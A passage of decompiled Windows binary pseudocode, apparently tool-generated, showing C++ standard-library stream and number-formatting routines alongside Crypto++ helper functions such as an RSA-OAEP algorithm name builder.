  void (__thiscall ***v12)(_DWORD, int); // eax
  int *v13; // ecx
  char *v14; // ebx
  void (__thiscall ***v15)(_DWORD, int); // eax
  char *v16; // ebx
  char i; // al
  unsigned int v18; // ecx
  int *v19; // eax
  _WORD *v20; // esi
  char *v21; // eax
  unsigned int v22; // ebx
  unsigned int v23; // edi
  int v24; // edi
  int v25; // eax
  int *v26; // ecx
  unsigned __int16 *v27; // eax
  int *v28; // eax
  unsigned __int16 *v29; // eax
  int *v30; // eax
  unsigned __int16 *v31; // eax
  int v32; // ecx
  _DWORD *v33; // edx
  int *v34; // eax
  int *v35; // eax
  void *v36; // ecx
  void *v37; // ecx
  _DWORD *result; // eax
  int v39; // [esp-28h] [ebp-98h]
  int v40; // [esp+1Ch] [ebp-54h]
  int v41; // [esp+20h] [ebp-50h] BYREF
  int v42; // [esp+24h] [ebp-4Ch]
  int v43; // [esp+28h] [ebp-48h]
  char *v44; // [esp+2Ch] [ebp-44h]
  int v45[5]; // [esp+30h] [ebp-40h] BYREF
  unsigned int v46; // [esp+44h] [ebp-2Ch]
  int v47[4]; // [esp+48h] [ebp-28h] BYREF
  unsigned int v48; // [esp+58h] [ebp-18h]
  unsigned int v49; // [esp+5Ch] [ebp-14h]
  int v50; // [esp+6Ch] [ebp-4h]
  int savedregs; // [esp+70h] [ebp+0h] BYREF
  _DWORD *v52; // [esp+84h] [ebp+14h]

  v8 = a8;
  v43 = 0;
  v9 = a8 && (*a7 == 43 || *a7 == 45);
  v40 = v9;
  if ( (*((_DWORD *)a5 + 5) & 0xE00) == 2048 )
  {
    v10 = v9 + 2;
    if ( v9 + 2 <= a8 && a7[v9] == 48 )
    {
      v11 = a7[v9 + 1];
      if ( v11 == 120 || v11 == 88 )
      {
        v9 += 2;
        v40 = v10;
      }
    }
  }
  v50 = 0;
  v42 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  (*(void (**)(void))(*(_DWORD *)v42 + 4))();
  v43 = 1;
  v44 = sub_4251A0((int)&savedregs, (int)&v41);
  v43 = 0;
  v50 = -1;
  if ( v42 )
  {
    v12 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v42 + 8))(v42);
    if ( v12 )
      (**v12)(v12, 1);
  }
  v48 = 0;
  v49 = 7;
  LOWORD(v47[0]) = 0;
  sub_41E9A0(v47, a8, 0);
  v50 = 1;
  v13 = v47;
  if ( v49 >= 8 )
    v13 = (int *)v47[0];
  (*(void (__thiscall **)(char *, _BYTE *, _BYTE *, int *))(*(_DWORD *)v44 + 44))(v44, a7, &a7[a8], v13);
  LOBYTE(v50) = 2;
  v42 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  (*(void (**)(void))(*(_DWORD *)v42 + 4))();
  v43 = 2;
  v14 = (char *)sub_4247B0((int)&savedregs, (int)&v41);
  v44 = v14;
  v43 = 0;
  LOBYTE(v50) = 1;
  if ( v42 )
  {
    v15 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v42 + 8))(v42);
    if ( v15 )
      (**v15)(v15, 1);
  }
  sub_421530(v14, (int)v45);
  LOBYTE(v50) = 3;
  v16 = (char *)v45;
  if ( v46 >= 0x10 )
    v16 = (char *)v45[0];
  if ( *v16 != 127 && *v16 > 0 )
  {
    v44 = (char *)(*(unsigned __int16 (__thiscall **)(char *))(*(_DWORD *)v44 + 16))(v44);
    for ( i = *v16; i != 127; i = *v21 )
    {
      if ( i <= 0 || i >= v8 - v9 )
        break;
      v8 -= i;
      v18 = v48;
      if ( v48 < v8 )
        sub_421040();
      if ( v49 == v48 )
      {
        LOBYTE(v42) = 0;
        sub_4253C0(v47, 1u, v42, v8, 1u, (unsigned __int16)v44);
      }
      else
      {
        ++v48;
        v19 = v47;
        if ( v49 >= 8 )
          v19 = (int *)v47[0];
        v20 = (_WORD *)v19 + v8;
        memmove_0(v20 + 1, v20, 2 * (v18 - v8) + 2);
        *v20 = (_WORD)v44;
        v9 = v40;
      }
      v21 = v16 + 1;
      if ( v16[1] <= 0 )
        v21 = v16;
      v16 = v21;
    }
  }
  v22 = v48;
  v23 = *((_DWORD *)a5 + 8);
  if ( a5[4] <= 0 || v23 <= v48 )
    v24 = 0;
  else
    v24 = v23 - v48;
  v25 = *((_DWORD *)a5 + 5) & 0x1C0;
  if ( v25 == 64 )
  {
    v31 = (unsigned __int16 *)v47;
    if ( v49 >= 8 )
      v31 = (unsigned __int16 *)v47[0];
    v28 = sub_420270(a1, &v41, a3, a4, v31, v9);
  }
  else if ( v25 == 256 )
  {
    v29 = (unsigned __int16 *)v47;
    if ( v49 >= 8 )
      v29 = (unsigned __int16 *)v47[0];
    v30 = sub_420270(a1, &v41, a3, a4, v29, v9);
    v28 = sub_4201F0(a1, &v41, *v30, (_DWORD *)v30[1], a6, v24);
    v24 = 0;
  }
  else
  {
    v26 = sub_4201F0(a1, &v41, a3, a4, a6, v24);
    v24 = 0;
    v27 = (unsigned __int16 *)v47;
    if ( v49 >= 8 )
      v27 = (unsigned __int16 *)v47[0];
    v28 = sub_420270(a1, &v41, *v26, (_DWORD *)v26[1], v27, v9);
  }
  v32 = *v28;
  v33 = (_DWORD *)v28[1];
  v34 = v47;
  if ( v49 >= 8 )
    v34 = (int *)v47[0];
  v35 = sub_420270(a1, &v41, v32, v33, (unsigned __int16 *)v34 + v9, v22 - v9);
  v39 = *v35;
  v52 = (_DWORD *)v35[1];
  *((_DWORD *)a5 + 8) = 0;
  *((_DWORD *)a5 + 9) = 0;
  sub_4201F0(a1, a2, v39, v52, a6, v24);
  LOBYTE(v50) = 1;
  if ( v46 >= 0x10 )
  {
    v36 = (void *)v45[0];
    if ( v46 + 1 >= 0x1000 )
    {
      v36 = *(void **)(v45[0] - 4);
      if ( (unsigned int)(v45[0] - (_DWORD)v36 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v36);
  }
  v45[4] = 0;
  v46 = 15;
  LOBYTE(v45[0]) = 0;
  v50 = -1;
  if ( v49 >= 8 )
  {
    v37 = (void *)v47[0];
    if ( 2 * v49 + 2 >= 0x1000 )
    {
      v37 = *(void **)(v47[0] - 4);
      if ( (unsigned int)(v47[0] - (_DWORD)v37 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v37);
  }
  v48 = 0;
  LOWORD(v47[0]) = 0;
  result = a2;
  v49 = 7;
  return result;
}
// 421040: using guessed type void __noreturn sub_421040(void);

//----- (00420770) --------------------------------------------------------
_BYTE *__cdecl sub_420770(int a1, _BYTE *a2, _BYTE *a3, __int16 a4)
{
  _BYTE *v4; // ecx
  _BYTE *v5; // edx
  int v6; // ecx
  _BYTE *result; // eax

  *a2 = 37;
  v4 = a2 + 1;
  if ( (a4 & 0x20) != 0 )
  {
    *v4 = 43;
    v4 = a2 + 2;
  }
  if ( (a4 & 8) != 0 )
    *v4++ = 35;
  v5 = v4 + 1;
  if ( *a3 == 76 )
  {
    *v4 = 73;
    *(_WORD *)v5 = 13366;
    v5 = v4 + 3;
  }
  else
  {
    *v4 = *a3;
  }
  v6 = a4 & 0xE00;
  if ( v6 == 1024 )
  {
    *v5 = 111;
    result = a2;
    v5[1] = 0;
  }
  else
  {
    if ( v6 == 2048 )
      *v5 = ~(8 * a4) & 0x20 | 0x58;
    else
      *v5 = a3[1];
    result = a2;
    v5[1] = 0;
  }
  return result;
}

//----- (00420800) --------------------------------------------------------
_DWORD *__cdecl sub_420800(int a1, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, int a6, char *Str, unsigned int a8)
{
  int v8; // esi
  const char *v9; // edx
  int v10; // eax
  char v11; // cl
  unsigned int v12; // edi
  void (__thiscall ***v13)(_DWORD, int); // eax
  int *v14; // ecx
  void (__thiscall ***v15)(_DWORD, int); // eax
  bool v16; // zf
  __int16 v17; // cx
  int *v18; // eax
  char *v19; // ebx
  char i; // al
  unsigned int v21; // ecx
  int *v22; // eax
  unsigned __int16 *v23; // esi
  char *v24; // eax
  unsigned int v25; // ebx
  unsigned int v26; // edi
  int v27; // edi
  int v28; // eax
  int *v29; // ecx
  unsigned __int16 *v30; // eax
  int *v31; // eax
  unsigned __int16 *v32; // eax
  int *v33; // eax
  unsigned __int16 *v34; // eax
  int v35; // ecx
  _DWORD *v36; // edx
  int *v37; // eax
  int *v38; // eax
  void *v39; // ecx
  void *v40; // ecx
  _DWORD *result; // eax
  int v42; // [esp-28h] [ebp-A0h]
  int v43; // [esp+14h] [ebp-64h]
  int v44; // [esp+18h] [ebp-60h]
  unsigned __int16 v45; // [esp+1Ch] [ebp-5Ch]
  int v46; // [esp+24h] [ebp-54h] BYREF
  int v47; // [esp+28h] [ebp-50h]
  void *v48; // [esp+2Ch] [ebp-4Ch]
  int v49; // [esp+30h] [ebp-48h]
  int v50[5]; // [esp+34h] [ebp-44h] BYREF
  unsigned int v51; // [esp+48h] [ebp-30h]
  int v52[4]; // [esp+4Ch] [ebp-2Ch] BYREF
  unsigned int v53; // [esp+5Ch] [ebp-1Ch]
  unsigned int v54; // [esp+60h] [ebp-18h]
  char Control[2]; // [esp+64h] [ebp-14h] BYREF
  int v56; // [esp+74h] [ebp-4h]
  int savedregs; // [esp+78h] [ebp+0h] BYREF
  _DWORD *v58; // [esp+8Ch] [ebp+14h]

  v49 = 0;
  v8 = a8 && (*Str == 43 || *Str == 45);
  v44 = v8;
  if ( (*((_DWORD *)a5 + 5) & 0x3000) == 12288 )
  {
    v10 = v8 + 2;
    v9 = "pP";
    if ( v8 + 2 <= a8 && Str[v8] == 48 )
    {
      v11 = Str[v8 + 1];
      if ( v11 == 120 || v11 == 88 )
      {
        v8 += 2;
        v44 = v10;
      }
    }
  }
  else
  {
    v9 = "eE";
  }
  v43 = strcspn(Str, v9);
  strcpy(Control, ".");
  Control[0] = *localeconv()->decimal_point;
  v12 = strcspn(Str, Control);
  v56 = 0;
  v47 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  (*(void (**)(void))(*(_DWORD *)v47 + 4))();
  v49 = 1;
  v48 = sub_4251A0((int)&savedregs, (int)&v46);
  v49 = 0;
  v56 = -1;
  if ( v47 )
  {
    v13 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v47 + 8))(v47);
    if ( v13 )
      (**v13)(v13, 1);
  }
  v53 = 0;
  v54 = 7;
  LOWORD(v52[0]) = 0;
  sub_41E9A0(v52, a8, 0);
  v56 = 1;
  v14 = v52;
  if ( v54 >= 8 )
    v14 = (int *)v52[0];
  (*(void (__thiscall **)(void *, char *, char *, int *))(*(_DWORD *)v48 + 44))(v48, Str, &Str[a8], v14);
  LOBYTE(v56) = 2;
  v47 = *(_DWORD *)(*((_DWORD *)a5 + 12) + 4);
  (*(void (**)(void))(*(_DWORD *)v47 + 4))();
  v49 = 2;
  v48 = sub_4247B0((int)&savedregs, (int)&v46);
  v49 = 0;
  LOBYTE(v56) = 1;
  if ( v47 )
  {
    v15 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v47 + 8))(v47);
    if ( v15 )
      (**v15)(v15, 1);
  }
  sub_421530(v48, (int)v50);
  LOBYTE(v56) = 3;
  v45 = (*(int (__thiscall **)(void *))(*(_DWORD *)v48 + 16))(v48);
  v16 = v12 == a8;
  if ( v12 != a8 )
  {
    v17 = (*(int (__thiscall **)(void *))(*(_DWORD *)v48 + 12))(v48);
    v18 = v52;
    if ( v54 >= 8 )
      v18 = (int *)v52[0];
    v16 = v12 == a8;
    *((_WORD *)v18 + v12) = v17;
  }
  if ( v16 )
    v12 = v43;
  v19 = (char *)v50;
  if ( v51 >= 0x10 )
    v19 = (char *)v50[0];
  for ( i = *v19; i != 127; i = *v24 )
  {
    if ( i <= 0 || i >= v12 - v8 )
      break;
    v12 -= i;
    v21 = v53;
    if ( v53 < v12 )
      sub_421040();
    if ( v54 == v53 )
    {
      LOBYTE(v43) = 0;
      sub_4253C0(v52, 1u, v43, v12, 1u, v45);
    }
    else
    {
      ++v53;
      v22 = v52;
      if ( v54 >= 8 )
        v22 = (int *)v52[0];
      v23 = (unsigned __int16 *)v22 + v12;
      memmove_0(v23 + 1, v23, 2 * (v21 - v12) + 2);
      *v23 = v45;
      v8 = v44;
    }
    v24 = v19 + 1;
    if ( v19[1] <= 0 )
      v24 = v19;
    v19 = v24;
  }
  v25 = v53;
  v26 = *((_DWORD *)a5 + 8);
  if ( a5[4] <= 0 || v26 <= v53 )
    v27 = 0;
  else
    v27 = v26 - v53;
  v28 = *((_DWORD *)a5 + 5) & 0x1C0;
  if ( v28 == 64 )
  {
    v34 = (unsigned __int16 *)v52;
    if ( v54 >= 8 )
      v34 = (unsigned __int16 *)v52[0];
    v31 = sub_420270(a1, &v46, a3, a4, v34, v8);
  }
  else if ( v28 == 256 )
  {
    v32 = (unsigned __int16 *)v52;
    if ( v54 >= 8 )
      v32 = (unsigned __int16 *)v52[0];
    v33 = sub_420270(a1, &v46, a3, a4, v32, v8);
    v31 = sub_4201F0(a1, &v46, *v33, (_DWORD *)v33[1], a6, v27);
    v27 = 0;
  }
  else
  {
    v29 = sub_4201F0(a1, &v46, a3, a4, a6, v27);
    v27 = 0;
    v30 = (unsigned __int16 *)v52;
    if ( v54 >= 8 )
      v30 = (unsigned __int16 *)v52[0];
    v31 = sub_420270(a1, &v46, *v29, (_DWORD *)v29[1], v30, v8);
  }
  v35 = *v31;
  v36 = (_DWORD *)v31[1];
  v37 = v52;
  if ( v54 >= 8 )
    v37 = (int *)v52[0];
  v38 = sub_420270(a1, &v46, v35, v36, (unsigned __int16 *)v37 + v8, v25 - v8);
  v42 = *v38;
  v58 = (_DWORD *)v38[1];
  *((_DWORD *)a5 + 8) = 0;
  *((_DWORD *)a5 + 9) = 0;
  sub_4201F0(a1, a2, v42, v58, a6, v27);
  LOBYTE(v56) = 1;
  if ( v51 >= 0x10 )
  {
    v39 = (void *)v50[0];
    if ( v51 + 1 >= 0x1000 )
    {
      v39 = *(void **)(v50[0] - 4);
      if ( (unsigned int)(v50[0] - (_DWORD)v39 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v39);
  }
  v50[4] = 0;
  v51 = 15;
  LOBYTE(v50[0]) = 0;
  v56 = -1;
  if ( v54 >= 8 )
  {
    v40 = (void *)v52[0];
    if ( 2 * v54 + 2 >= 0x1000 )
    {
      v40 = *(void **)(v52[0] - 4);
      if ( (unsigned int)(v52[0] - (_DWORD)v40 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v40);
  }
  v53 = 0;
  LOWORD(v52[0]) = 0;
  result = a2;
  v54 = 7;
  return result;
}
// 421040: using guessed type void __noreturn sub_421040(void);

//----- (00420CC0) --------------------------------------------------------
_BYTE *__cdecl sub_420CC0(int a1, _BYTE *a2, char a3, __int16 a4)
{
  _BYTE *v4; // eax
  _BYTE *v5; // eax
  int v6; // ecx

  *a2 = 37;
  v4 = a2 + 1;
  if ( (a4 & 0x20) != 0 )
  {
    *v4 = 43;
    v4 = a2 + 2;
  }
  if ( (a4 & 0x10) != 0 )
    *v4++ = 35;
  *(_WORD *)v4 = 10798;
  v5 = v4 + 2;
  if ( a3 )
    *v5++ = a3;
  v6 = a4 & 0x3000;
  if ( (a4 & 4) != 0 )
  {
    if ( v6 != 0x2000 )
    {
      if ( v6 == 12288 )
        *v5 = 65;
      else
        *v5 = 2 * (v6 != 4096) + 69;
      v5[1] = 0;
      return a2;
    }
LABEL_14:
    *v5 = 102;
    v5[1] = 0;
    return a2;
  }
  if ( v6 == 0x2000 )
    goto LABEL_14;
  if ( v6 == 12288 )
    *v5 = 97;
  else
    *v5 = 2 * (v6 != 4096) + 101;
  v5[1] = 0;
  return a2;
}

//----- (00420D80) --------------------------------------------------------
int __cdecl sub_420D80(int a1)
{
  char *v1; // eax
  char *v2; // eax
  char *v3; // eax
  void **v4; // eax
  void *v5; // ecx
  void *v6; // ecx
  void *v7; // ecx
  void *v8; // ecx
  int result; // eax
  int v10[5]; // [esp+8h] [ebp-74h] BYREF
  unsigned int v11; // [esp+1Ch] [ebp-60h]
  int v12[5]; // [esp+20h] [ebp-5Ch] BYREF
  unsigned int v13; // [esp+34h] [ebp-48h]
  int v14[5]; // [esp+38h] [ebp-44h] BYREF
  unsigned int v15; // [esp+4Ch] [ebp-30h]
  int v16; // [esp+50h] [ebp-2Ch]
  void *v17[4]; // [esp+54h] [ebp-28h] BYREF
  int v18; // [esp+64h] [ebp-18h]
  unsigned int v19; // [esp+68h] [ebp-14h]
  int v20; // [esp+6Ch] [ebp-10h]
  int v21; // [esp+78h] [ebp-4h]

  v16 = a1;
  v20 = 0;
  v18 = 0;
  v19 = 15;
  LOBYTE(v17[0]) = 0;
  sub_41EF80(v17, "OAEP-", 5u);
  v21 = 1;
  v1 = (char *)sub_421F20((int)v10, (char *)v17, "MGF1");
  LOBYTE(v21) = 2;
  v2 = (char *)sub_421F20((int)v12, v1, "(");
  LOBYTE(v21) = 3;
  v3 = (char *)sub_421F20((int)v14, v2, "SHA-1");
  LOBYTE(v21) = 5;
  v4 = sub_4198A0(v3, ")");
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  v20 = 16;
  *(_OWORD *)a1 = *(_OWORD *)v4;
  *(_QWORD *)(a1 + 16) = *((_QWORD *)v4 + 2);
  v4[4] = 0;
  v4[5] = (void *)15;
  *(_BYTE *)v4 = 0;
  v21 = 3;
  v20 = 1;
  if ( v15 >= 0x10 )
  {
    v5 = (void *)v14[0];
    if ( v15 + 1 >= 0x1000 )
    {
      v5 = *(void **)(v14[0] - 4);
      if ( (unsigned int)(v14[0] - (_DWORD)v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v5);
  }
  v14[4] = 0;
  v15 = 15;
  LOBYTE(v14[0]) = 0;
  LOBYTE(v21) = 2;
  if ( v13 >= 0x10 )
  {
    v6 = (void *)v12[0];
    if ( v13 + 1 >= 0x1000 )
    {
      v6 = *(void **)(v12[0] - 4);
      if ( (unsigned int)(v12[0] - (_DWORD)v6 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v6);
  }
  v12[4] = 0;
  v13 = 15;
  LOBYTE(v12[0]) = 0;
  LOBYTE(v21) = 1;
  if ( v11 >= 0x10 )
  {
    v7 = (void *)v10[0];
    if ( v11 + 1 >= 0x1000 )
    {
      v7 = *(void **)(v10[0] - 4);
      if ( (unsigned int)(v10[0] - (_DWORD)v7 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v7);
  }
  v10[4] = 0;
  v11 = 15;
  LOBYTE(v10[0]) = 0;
  LOBYTE(v21) = 0;
  if ( v19 >= 0x10 )
  {
    v8 = v17[0];
    if ( v19 + 1 >= 0x1000 )
    {
      v8 = (void *)*((_DWORD *)v17[0] - 1);
      if ( (unsigned int)(v17[0] - v8 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v8);
  }
  v18 = 0;
  result = a1;
  v19 = 15;
  LOBYTE(v17[0]) = 0;
  return result;
}

//----- (00420FD0) --------------------------------------------------------
void __cdecl sub_420FD0(unsigned int a1)
{
  char pExceptionObject[40]; // [esp+4h] [ebp-50h] BYREF
  _DWORD v2[10]; // [esp+2Ch] [ebp-28h] BYREF

  if ( a1 > 0x3FFFFFFF )
  {
    sub_419B80((int)v2, "AllocatorBase: requested size would cause integer overflow");
    v2[9] = 0;
    sub_405230(pExceptionObject, v2);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
}

//----- (00421040) --------------------------------------------------------
void __noreturn sub_421040()
{
  sub_46A1A3((int)"invalid string position");
}
// 421040: using guessed type void __noreturn sub_421040();

//----- (00421050) --------------------------------------------------------
int __thiscall sub_421050(_BYTE *this)
{
  int result; // eax
  _DWORD v3[8]; // [esp+0h] [ebp-20h] BYREF

  v3[4] = v3;
  v3[7] = 0;
  result = *(_DWORD *)(*(_DWORD *)this + 4);
  if ( !*(_DWORD *)&this[result + 12] && (this[result + 20] & 2) != 0 )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)&this[result + 56] + 52))(*(_DWORD *)&this[result + 56]);
    if ( result == -1 )
      return sub_41F730((int)&this[*(_DWORD *)(*(_DWORD *)this + 4)], 4, 0);
  }
  return result;
}

//----- (004210E0) --------------------------------------------------------
_DWORD *__thiscall sub_4210E0(_DWORD *this)
{
  _DWORD *result; // eax

  this[3] = this + 1;
  this[4] = this + 2;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[12] = this + 10;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  result = (_DWORD *)this[11];
  *result = 0;
  return result;
}

//----- (00421140) --------------------------------------------------------
_DWORD *__thiscall sub_421140(_DWORD *this)
{
  _DWORD *v2; // esi

  *this = &std::wstreambuf::`vftable';
  v2 = operator new(8u);
  *(_QWORD *)v2 = 0i64;
  v2[1] = std::locale::_Init(1);
  this[13] = v2;
  this[3] = this + 1;
  this[4] = this + 2;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[12] = this + 10;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  *(_DWORD *)this[11] = 0;
  return this;
}
// 469E4D: using guessed type struct std::locale::_Locimp *__cdecl std::locale::_Init(bool);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BD57C: using guessed type void *std::wstreambuf::`vftable';

//----- (004211D0) --------------------------------------------------------
void __thiscall sub_4211D0(int this, int a2, char a3)
{
  char *v4; // eax
  __int16 v5; // di
  void (__thiscall ***v6)(_DWORD, int); // eax
  bool v7; // zf
  char v8[4]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+14h] [ebp-14h]
  int v10; // [esp+18h] [ebp-10h]
  int v11; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v10 = 0;
  sub_4037C0((_DWORD *)this);
  *(_DWORD *)(this + 56) = a2;
  *(_DWORD *)(this + 60) = 0;
  v11 = 0;
  v9 = *(_DWORD *)(*(_DWORD *)(this + 48) + 4);
  (*(void (**)(void))(*(_DWORD *)v9 + 4))();
  v4 = sub_4251A0((int)&savedregs, (int)v8);
  v5 = (*(int (__thiscall **)(char *, int))(*(_DWORD *)v4 + 48))(v4, 32);
  v10 = 0;
  v11 = -1;
  if ( v9 )
  {
    v6 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v9 + 8))(v9);
    if ( v6 )
      (**v6)(v6, 1);
  }
  v7 = *(_DWORD *)(this + 56) == 0;
  *(_WORD *)(this + 64) = v5;
  if ( v7 )
    sub_4036A0((_DWORD *)this, *(_DWORD *)(this + 12) | 4, 0);
  if ( a3 )
    std::ios_base::_Addstd((struct std::ios_base *)this);
}
// 46A325: using guessed type void __cdecl std::ios_base::_Addstd(struct std::ios_base *);
// 4211D0: using guessed type char var_18[4];

//----- (004212B0) --------------------------------------------------------
int *__thiscall sub_4212B0(int *this)
{
  int v2; // ecx
  int v3; // ecx
  _BYTE *v5; // [esp+8h] [ebp-18h] BYREF
  char v6; // [esp+Ch] [ebp-14h]
  int v7; // [esp+1Ch] [ebp-4h]

  if ( *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56) )
  {
    sub_41E5D0(&v5, this);
    v7 = 0;
    if ( v6 )
    {
      v2 = *(int *)((char *)this + *(_DWORD *)(*this + 4) + 56);
      if ( (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 52))(v2) == -1 )
        sub_4036A0(
          (int *)((char *)this + *(_DWORD *)(*this + 4)),
          *(int *)((char *)this + *(_DWORD *)(*this + 4) + 12) | 4,
          0);
    }
    v7 = 1;
    if ( !(unsigned __int8)j____uncaught_exception() )
      sub_421050(v5);
    v7 = -1;
    v3 = *(_DWORD *)&v5[*(_DWORD *)(*(_DWORD *)v5 + 4) + 56];
    if ( v3 )
      (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  }
  return this;
}
// 46A06B: using guessed type int j____uncaught_exception(void);

//----- (00421380) --------------------------------------------------------
_DWORD *__thiscall sub_421380(_DWORD *this)
{
  _DWORD *v2; // esi

  *this = &std::streambuf::`vftable';
  v2 = operator new(8u);
  *(_QWORD *)v2 = 0i64;
  v2[1] = std::locale::_Init(1);
  this[13] = v2;
  this[3] = this + 1;
  this[4] = this + 2;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[12] = this + 10;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  *(_DWORD *)this[11] = 0;
  return this;
}
// 469E4D: using guessed type struct std::locale::_Locimp *__cdecl std::locale::_Init(bool);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8584: using guessed type void *std::streambuf::`vftable';

//----- (00421410) --------------------------------------------------------
void __thiscall sub_421410(int this, int a2, char a3)
{
  char v4; // al
  bool v5; // zf

  sub_4037C0((_DWORD *)this);
  *(_DWORD *)(this + 56) = a2;
  *(_DWORD *)(this + 60) = 0;
  v4 = sub_421590((_DWORD *)this, 32);
  v5 = *(_DWORD *)(this + 56) == 0;
  *(_BYTE *)(this + 64) = v4;
  if ( v5 )
    sub_4036A0((_DWORD *)this, *(_DWORD *)(this + 12) | 4, 0);
  if ( a3 )
    std::ios_base::_Addstd((struct std::ios_base *)this);
}
// 46A325: using guessed type void __cdecl std::ios_base::_Addstd(struct std::ios_base *);

//----- (00421460) --------------------------------------------------------
int __thiscall sub_421460(_DWORD *this, char a2, char a3)
{
  char v3; // dl

  v3 = a2 | 4;
  if ( this[14] )
    v3 = a2;
  return sub_4036A0(this, v3, a3);
}

//----- (00421480) --------------------------------------------------------
void **__thiscall sub_421480(void **this, char a2)
{
  *this = &std::numpunct<wchar_t>::`vftable';
  j___free_base(this[2]);
  j___free_base(this[4]);
  j___free_base(this[5]);
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BE63C: using guessed type void *std::numpunct<wchar_t>::`vftable';

//----- (00421530) --------------------------------------------------------
int __thiscall sub_421530(void *this, int a2)
{
  (*(void (__cdecl **)(int))(*(_DWORD *)this + 20))(a2);
  return a2;
}

//----- (00421590) --------------------------------------------------------
char __thiscall sub_421590(_DWORD *this, int a2)
{
  char *v2; // eax
  char v3; // bl
  void (__thiscall ***v4)(_DWORD, int); // eax
  char v6[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v7; // [esp+Ch] [ebp-18h]
  int v8; // [esp+10h] [ebp-14h]
  int v9; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v8 = 0;
  v9 = 0;
  v7 = *(_DWORD *)(this[12] + 4);
  (*(void (**)(void))(*(_DWORD *)v7 + 4))();
  v8 = 1;
  v2 = sub_421800((int)&savedregs, (int)v6);
  v3 = (*(int (__thiscall **)(char *, int))(*(_DWORD *)v2 + 32))(v2, a2);
  v8 = 0;
  v9 = -1;
  if ( v7 )
  {
    v4 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v7 + 8))(v7);
    if ( v4 )
      (**v4)(v4, 1);
  }
  return v3;
}
// 421590: using guessed type char var_1C[4];

//----- (00421640) --------------------------------------------------------
int *__thiscall sub_421640(int *this)
{
  int v2; // edx
  int **v3; // edi
  int i; // eax
  int *j; // ecx

  v2 = *this;
  v3 = *(int ***)(*this + 8);
  if ( *((_BYTE *)v3 + 13) )
  {
    for ( i = *(_DWORD *)(v2 + 4); !*(_BYTE *)(i + 13); i = *(_DWORD *)(i + 4) )
    {
      if ( v2 != *(_DWORD *)(i + 8) )
        break;
      *this = i;
      v2 = i;
    }
    *this = i;
    return this;
  }
  else
  {
    for ( j = *v3; !*((_BYTE *)j + 13); j = (int *)*j )
      v3 = (int **)j;
    *this = (int)v3;
    return this;
  }
}

//----- (004216A0) --------------------------------------------------------
void __stdcall sub_4216A0(_DWORD *a1)
{
  _DWORD *v1; // ebx
  _DWORD *i; // edi
  void **v3; // esi
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // eax

  v1 = a1;
  for ( i = a1; !*((_BYTE *)i + 13); v1 = i )
  {
    sub_4216A0(i[2]);
    i = (_DWORD *)*i;
    v3 = (void **)(v1 + 4);
    v4 = v1[15];
    if ( v4 >= 0x10 )
    {
      v5 = (_DWORD *)v1[10];
      if ( v4 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
          goto LABEL_14;
        v5 = (_DWORD *)*(v5 - 1);
      }
      sub_46C87D(v5);
    }
    v1[14] = 0;
    v1[15] = 15;
    *((_BYTE *)v1 + 40) = 0;
    v6 = v1[9];
    if ( v6 >= 0x10 )
    {
      v7 = *v3;
      if ( v6 + 1 >= 0x1000 )
      {
        if ( (unsigned int)v7 - *(v7 - 1) - 4 > 0x1F )
LABEL_14:
